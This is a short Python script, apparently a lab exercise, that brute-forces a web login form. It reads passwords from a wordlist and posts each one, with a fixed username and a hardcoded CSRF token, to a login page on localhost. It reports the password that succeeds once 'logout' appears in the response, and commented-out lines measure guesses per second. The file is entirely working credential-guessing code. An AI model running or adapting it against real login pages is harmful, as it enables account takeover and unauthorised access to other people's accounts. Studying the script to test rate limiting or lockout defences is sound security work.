import sys
import requests
import time


def main(argv):
    username = sys.argv[2]
    wordList = []

    with open(sys.argv[1], 'r') as f:
        lines = f.readlines()
        

        for passwordLines in lines:
            wordList.append(passwordLines.strip('\n'))
        
    # c = 0
    # t0= time.perf_counter()
    print("START")
    for passwords in wordList:
            
        currentPassword = passwords.strip('\n')
        url = 'http://127.0.0.1:8000/login.html'

        payload = {'uname': username.strip(), 'pword': currentPassword.strip(), 'csrfmiddlewaretoken': '784pOSWrr8YV9CNYag9Uy7iVksQbqXrTJADLllN6yerpW8A6SKG5jpGMvK6Uz5kZ'}
        session = requests.session()
        response = session.post(url, data=payload)
        # c=c+1
        # print(c)
        if (b'logout' in response.content):
            # print(c)
            # print("END")
            print('login successful')
            print('Given Username: '+username)
            print('Sucessful Password: '+passwords)
            # t1 = time.perf_counter() - t0
            # guessesPerSecond = c/t1
            # print("Guesses Per Second: "+str(guessesPerSecond))
            # requests.get('http://127.0.0.1:8000/index.html')
            exit()
        
    print("Could not log in user")
        
    

if __name__ == "__main__":
    main(sys.argv[1:])